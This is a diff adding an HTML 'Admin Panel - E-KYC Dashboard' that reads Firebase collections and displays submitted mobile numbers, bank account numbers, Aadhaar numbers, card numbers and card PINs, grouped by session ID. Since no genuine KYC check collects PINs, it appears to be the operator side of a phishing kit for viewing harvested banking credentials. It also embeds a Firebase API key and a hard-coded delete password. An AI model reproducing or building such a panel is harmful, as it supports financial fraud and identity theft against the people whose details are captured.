@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Panel</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+      margin: 0;
+      padding: 20px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .btn-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .toggle-btn {
+      padding: 10px 20px;
+      margin: 0 10px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .section {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 40px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    .entry {
+      background: #f9f9f9;
+      padding: 12px;
+      margin-bottom: 10px;
+      border-left: 5px solid #007BFF;
+      border-radius: 5px;
+      position: relative;
+    }
+    .field {
+      margin: 4px 0;
+    }
+    .timestamp {
+      font-size: 12px;
+      color: gray;
+      margin-top: 5px;
+    }
+    .delete-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: red;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    .group-block {
+      display: flex;
+      gap: 20px;
+      border: 1px solid #ccc;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      background: #fff;
+    }
+    .group-column {
+      flex: 1;
+    }
+    .group-column h4 {
+      margin-bottom: 10px;
+      color: #007BFF;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Admin Panel - E-KYC Dashboard</h2>
+
+  <div class="btn-container">
+    <button class="toggle-btn" onclick="showSection('users')">User Details</button>
+    <button class="toggle-btn" onclick="showSection('cards')">Card Details</button>
+    <button class="toggle-btn" onclick="showSection('group')">Group Data</button>
+  </div>
+
+  <div class="section" id="usersSection">
+    <h3>Users Info</h3>
+    <div id="usersData"></div>
+  </div>
+
+  <div class="section" id="cardSection" style="display: none;">
+    <h3>Card Details</h3>
+    <div id="cardData"></div>
+  </div>
+
+  <div class="section" id="groupSection" style="display: none;">
+    <h3>Grouped Data (by Session ID)</h3>
+    <div id="groupedData"></div>
+  </div>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyBbJGcgqT9jTyB5osrUhoNLH7pRA7XzH08",
+  authDomain: "maha-4c3c1.firebaseapp.com",
+  projectId: "maha-4c3c1",
+  storageBucket: "maha-4c3c1.appspot.com", // ✅ FIXED
+  messagingSenderId: "593096443604",
+  appId: "1:593096443604:web:72cd492e28f13750f4dd41"
+};
+;
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    const usersMap = new Map();
+    const cardsMap = new Map();
+
+    // Load Users Info
+    db.collection("users").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+      const usersData = document.getElementById("usersData");
+      usersData.innerHTML = "";
+      usersMap.clear();
+
+      snapshot.forEach(doc => {
+        const data = doc.data();
+        const date = data.timestamp?.toDate();
+        const formatted = date ? date.toLocaleString() : "-";
+        const sessionId = data.sessionId || "-";
+        const div = document.createElement("div");
+        div.className = "entry";
+        div.innerHTML = `
+          <div class="field"><strong>Mobile:</strong> ${data.mobile || "-"}</div>
+          <div class="field"><strong>Account:</strong> ${data.account || "-"}</div>
+          <div class="field"><strong>Aadhaar:</strong> ${data.aadhaar || "-"}</div>
+          <div class="field"><strong>Session ID:</strong> ${sessionId}</div>
+          <div class="timestamp">Submitted: ${formatted}</div>
+          <button class="delete-btn" onclick="deleteEntry('${doc.id}', 'users')">Delete</button>
+        `;
+        usersData.appendChild(div);
+        usersMap.set(sessionId, data);
+      });
+
+      renderGroupedData();
+    });
+
+    // Load Card Details
+    db.collection("cards").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+      const cardData = document.getElementById("cardData");
+      cardData.innerHTML = "";
+      cardsMap.clear();
+
+      snapshot.forEach(doc => {
+        const data = doc.data();
+        const date = data.timestamp?.toDate();
+        const formatted = date ? date.toLocaleString() : "-";
+        const sessionId = data.sessionId || "-";
+        const div = document.createElement("div");
+        div.className = "entry";
+        div.innerHTML = `
+          <div class="field"><strong>Card:</strong> ${data.card || data.card_number || "-"}</div>
+          <div class="field"><strong>PIN:</strong> ${data.pin || "-"}</div>
+          <div class="field"><strong>Session ID:</strong> ${sessionId}</div>
+          <div class="timestamp">Submitted: ${formatted}</div>
+          <button class="delete-btn" onclick="deleteEntry('${doc.id}', 'cards')">Delete</button>
+        `;
+        cardData.appendChild(div);
+        cardsMap.set(sessionId, data);
+      });
+
+      renderGroupedData();
+    });
+
+    // Grouped Section Rendering
+    function renderGroupedData() {
+      const groupedData = document.getElementById("groupedData");
+      groupedData.innerHTML = "";
+
+      const allSessions = new Set([...usersMap.keys(), ...cardsMap.keys()]);
+      allSessions.forEach(sessionId => {
+        if (!sessionId || sessionId === "-") return;
+
+        const user = usersMap.get(sessionId);
+        const card = cardsMap.get(sessionId);
+        if (!user && !card) return;
+
+        const block = document.createElement("div");
+        block.className = "group-block";
+        block.innerHTML = `
+          <div class="group-column">
+            <h4>User Info</h4>
+            <div><strong>Mobile:</strong> ${user?.mobile || "-"}</div>
+            <div><strong>Account:</strong> ${user?.account || "-"}</div>
+            <div><strong>Aadhaar:</strong> ${user?.aadhaar || "-"}</div>
+          </div>
+          <div class="group-column">
+            <h4>Card Info</h4>
+            <div><strong>Card:</strong> ${card?.card || card?.card_number || "-"}</div>
+            <div><strong>PIN:</strong> ${card?.pin || "-"}</div>
+          </div>
+          <div class="group-column">
+            <h4>Session</h4>
+            <div><strong>ID:</strong> ${sessionId}</div>
+          </div>
+        `;
+        groupedData.appendChild(block);
+      });
+    }
+
+    // Show Sections
+    function showSection(type) {
+      document.getElementById("usersSection").style.display = "none";
+      document.getElementById("cardSection").style.display = "none";
+      document.getElementById("groupSection").style.display = "none";
+
+      if (type === "users") document.getElementById("usersSection").style.display = "block";
+      else if (type === "cards") document.getElementById("cardSection").style.display = "block";
+      else if (type === "group") document.getElementById("groupSection").style.display = "block";
+    }
+
+    // Delete with password
+    function deleteEntry(docId, collection) {
+      const pass = prompt("Enter password to delete:");
+      if (pass === "4542") {
+        db.collection(collection).doc(docId).delete();
+      } else {
+        alert("Wrong password!");
+      }
+    }
+  </script>
+</body>
+</html>
